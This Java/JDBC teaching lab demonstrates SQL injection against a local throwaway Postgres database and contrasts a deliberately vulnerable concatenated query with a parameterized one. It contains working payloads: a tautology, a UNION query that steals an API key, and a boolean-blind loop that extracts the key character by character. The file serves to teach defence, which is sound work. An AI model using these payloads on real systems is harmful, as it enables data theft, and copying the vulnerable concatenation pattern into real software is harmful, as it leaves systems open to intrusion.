// Layer 7 · Topic 2 — SQL injection as a string-building failure (Java / JDBC).
//
// Compiles with the JDK alone (java.sql.* is standard). RUNNING needs the
// PostgreSQL JDBC driver on the classpath and a Postgres on localhost:5432.
// This machine has no driver jar cached; fetch one once with network access:
//     curl -L -o /tmp/pg.jar https://jdbc.postgresql.org/download/postgresql-42.7.4.jar
//     java -cp .:/tmp/pg.jar Sqli
//
// Java's history worth carrying (README): PreparedStatement with `?` binds,
// but the DRIVER decides whether binding is server-side. The PostgreSQL JDBC
// driver binds server-side (and switches to a named prepared statement after
// a few executions); MySQL Connector/J historically defaulted to CLIENT-side
// rewriting -- same PreparedStatement class, a single assembled string on the
// wire. "I used a prepared statement" is a claim about your code, not the
// wire, and only the wire decides.
//
// What to look for: tautology dumps all users via Statement (concat), 0 rows
// (no error) via PreparedStatement; UNION steals the key only when vulnerable;
// the blind channel recovers 32 chars in ~linear requests.
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class Sqli {
    static final String SECRET_KEY = "S3CR3T_KEY_abcdef0123456789abcd0";
    static final String CHARSET =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";

    record Row(int id, String email, String name) {}

    // THE BUG: Statement + concatenation. Attacker bytes become SQL syntax.
    static List<Row> searchVulnerable(Connection c, String email) throws SQLException {
        String sql = "SELECT id, email, name FROM users WHERE email = '" + email + "'";
        try (Statement st = c.createStatement(); ResultSet rs = st.executeQuery(sql)) {
            return collect(rs);
        }
    }
    // Safe: PreparedStatement binds the value; with the pg driver, server-side.
    static List<Row> searchParameterized(Connection c, String email) throws SQLException {
        try (PreparedStatement ps = c.prepareStatement(
                "SELECT id, email, name FROM users WHERE email = ?")) {
            ps.setString(1, email);
            try (ResultSet rs = ps.executeQuery()) { return collect(rs); }
        }
    }
    static List<Row> collect(ResultSet rs) throws SQLException {
        List<Row> out = new ArrayList<>();
        while (rs.next()) out.add(new Row(rs.getInt(1), rs.getString(2), rs.getString(3)));
        return out;
    }

    public static void main(String[] args) throws Exception {
        System.out.println("Layer 7 · Topic 2 — SQL injection (Java / JDBC, real Postgres)\n");
        try (Connection sc = DriverManager.getConnection("jdbc:postgresql://localhost:5432/postgres")) {
            sc.createStatement().execute("DROP DATABASE IF EXISTS sqli_lab WITH (FORCE)");
            sc.createStatement().execute("CREATE DATABASE sqli_lab");
        } catch (SQLException e) {
            System.out.println("Cannot reach Postgres / driver missing -> " + e.getMessage());
            System.out.println("See the header for the one-time driver fetch. Code is the artifact.");
            return;
        }
        try (Connection c = DriverManager.getConnection("jdbc:postgresql://localhost:5432/sqli_lab")) {
            c.createStatement().execute("CREATE TABLE users (id int PRIMARY KEY, email text, name text)");
            c.createStatement().execute("CREATE TABLE api_keys (user_id int PRIMARY KEY, key text)");
            c.createStatement().execute("INSERT INTO users VALUES " +
                "(1,'alice@lab.test','alice'),(2,'bob@lab.test','bob'),(3,'carol@lab.test','carol')");
            c.createStatement().execute("INSERT INTO api_keys VALUES (1,'" + SECRET_KEY + "')");

            System.out.println("Payload 1 — boolean tautology  \"' OR '1'='1\"");
            System.out.printf("   %-14s -> %d rows%n", "vulnerable", searchVulnerable(c, "' OR '1'='1").size());
            System.out.printf("   %-14s -> %d rows%n", "parameterized", searchParameterized(c, "' OR '1'='1").size());

            System.out.println("\nPayload 2 — UNION cross-table (steal api_keys.key)");
            String uni = "' UNION SELECT user_id, key, key FROM api_keys--";
            List<Row> v = searchVulnerable(c, uni);
            String leaked = v.stream().filter(r -> r.email().equals(SECRET_KEY)).findFirst()
                             .map(Row::email).orElse("no");
            System.out.printf("   %-14s -> %d rows; secret leaked: %s%n", "vulnerable", v.size(), leaked);
            System.out.printf("   %-14s -> %d rows; secret leaked: no%n", "parameterized",
                              searchParameterized(c, uni).size());

            System.out.println("\nPayload 3 — boolean-blind extraction of the 32-char key");
            StringBuilder recovered = new StringBuilder();
            long requests = 0, t0 = System.nanoTime();
            for (int pos = 1; pos <= SECRET_KEY.length(); pos++) {
                for (char ch : CHARSET.toCharArray()) {
                    requests++;
                    String p = "nope' OR substr((SELECT key FROM api_keys WHERE user_id=1)," + pos + ",1)='" + ch;
                    if (!searchVulnerable(c, p).isEmpty()) { recovered.append(ch); break; }
                }
            }
            long ms = (System.nanoTime() - t0) / 1_000_000;
            System.out.println("   recovered: " + recovered);
            System.out.println("   correct:   " + recovered.toString().equals(SECRET_KEY));
            System.out.printf("   requests to recover %d chars, one char/request (measured): %d%n",
                              SECRET_KEY.length(), requests);
            System.out.println("   wall-clock: " + ms + " ms");
        }
        System.out.println("\nTakeaway: PreparedStatement binds -- but whether binding is server-side\n" +
                "is a property of the DRIVER, not the API. Only the wire decides.");
    }
}
